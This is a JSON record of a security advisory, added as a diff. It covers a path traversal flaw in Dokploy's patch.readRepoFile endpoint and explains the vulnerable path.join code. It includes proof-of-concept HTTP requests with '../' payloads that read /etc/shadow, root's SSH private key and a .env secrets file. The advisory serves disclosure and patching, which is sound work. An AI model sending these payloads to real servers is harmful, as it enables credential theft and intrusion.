@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-g6rj-m32j-2mc4",
+  "aliases": [],
+  "title": "Arbitrary File Read via Path Traversal in `patch.readRepoFile`",
+  "summary": "### Summary\r\n\r\nThe `patch.readRepoFile` tRPC endpoint allows any authenticated user with service read permission to read arbitrary files from the server filesystem via path traversal in the `filePath` parameter. The file path is joined using `path.join()` which resolves `../` components, enabling escape from the intended patch repository directory. This exposes sensitive files including SSH private keys, environment variables with API keys, and system credentials.\r\n\r\n### Details\r\n\r\nThe `readRepoFile` endpoint (`apps/dokploy/server/api/routers/patch.ts:204-241`) accepts a `filePath` parameter with no path traversal validation:\r\n\r\n```typescript\r\nreadRepoFile: protectedProcedure\r\n    .input(\r\n        z.object({\r\n            id: z.string().min(1),\r\n            type: z.enum([\"application\", \"compose\"]),\r\n            filePath: z.string(),   // NO validation against path traversal\r\n        }),\r\n    )\r\n    .query(async ({ input, ctx }) => {\r\n        await checkServicePermissionAndAccess(ctx, input.id, {\r\n            service: [\"read\"],\r\n        });\r\n        // ...\r\n        return await readPatchRepoFile(input.id, input.type, input.filePath);\r\n    }),\r\n```\r\n\r\nThe `readPatchRepoFile` function (`packages/server/src/services/patch-repo.ts:148-181`) uses `path.join()` to construct the full file path, which resolves `../` components:\r\n\r\n```typescript\r\nexport const readPatchRepoFile = async (id, type, filePath) => {\r\n    // ...\r\n    const repoPath = join(PATCH_REPOS_PATH, type, application.appName);\r\n    const fullPath = join(repoPath, filePath);  // path.join resolves ../\r\n\r\n    const command = `cat ${quote([fullPath])}`;\r\n\r\n    if (serverId) {\r\n        const result = await execAsyncRemote(serverId, command);\r\n        return result.stdout;\r\n    }\r\n\r\n    const result = await execAsync(command);\r\n    return result.stdout;\r\n};\r\n```\r\n\r\nWhen `filePath` is `../../../../../../etc/shadow`:\r\n- `repoPath` = `/var/lib/dokploy/patch-repos/application/my-app`\r\n- `fullPath` = `path.join(repoPath, \"../../../../../../etc/shadow\")` resolves to `/etc/shadow`\r\n\r\nThe file content is returned directly to the caller via `cat`. While `quote()` from `shell-quote` prevents command injection in the `cat` command, it does not prevent the path traversal.\r\n\r\nIf the application is deployed on a remote server (has a `serverId`), the file is read from that remote server via SSH (`execAsyncRemote`).\r\n\r\n### PoC\r\n\r\n**Prerequisite:** Authenticated user with `service.read` permission on any application or compose service.\r\n\r\n**Read /etc/shadow from local server:**\r\n\r\n```http\r\nGET /api/trpc/patch.readRepoFile?input={\"id\":\"<application-id>\",\"type\":\"application\",\"filePath\":\"../../../../../../etc/shadow\"}\r\nAuthorization: Bearer <session-token>\r\n```\r\n\r\n**Read SSH private keys:**\r\n\r\n```http\r\nGET /api/trpc/patch.readRepoFile?input={\"id\":\"<application-id>\",\"type\":\"application\",\"filePath\":\"../../../../../../root/.ssh/id_rsa\"}\r\nAuthorization: Bearer <session-token>\r\n```\r\n\r\n**Read Dokploy environment/secrets:**\r\n\r\n```http\r\nGET /api/trpc/patch.readRepoFile?input={\"id\":\"<application-id>\",\"type\":\"application\",\"filePath\":\"../../../../../../etc/dokploy/.env\"}\r\nAuthorization: Bearer <session-token>\r\n```\r\n\r\n**Read from remote server (if application has serverId):**\r\n\r\nThe same payloads work against remote servers. The `readPatchRepoFile` function checks `application.buildServerId || application.serverId` and if set, executes the `cat` command on that remote server via SSH.\r\n\r\n### Impact\r\n\r\n- **Confidentiality breach**: Read any file readable by the Dokploy process (typically runs as root)\r\n- **Credential theft**: SSH private keys (`/root/.ssh/id_rsa`), database passwords, API keys from `.env` files, TLS private keys\r\n- **Lateral movement**: Stolen SSH keys or credentials enable access to other systems\r\n- **Cross-server data access**: If the application has a remote `serverId`, files are read from that remote server\r\n- Any authenticated user with read access to any application or compose servic...",
+  "published_at": "2026-11-12T08:16:46.000Z",
+  "modified_at": "2026-11-12T08:16:46.000Z",
+  "severity": {
+    "level": "high",
+    "score": 7.7,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-22"
+  ],
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.31.1"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-g6rj-m32j-2mc4",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-g6rj-m32j-2mc4",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-g6rj-m32j-2mc4",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:105a569026b648a235a31d98e44e370849cb45744743da0d57e589a4e00444ae",
+  "note": null
+}
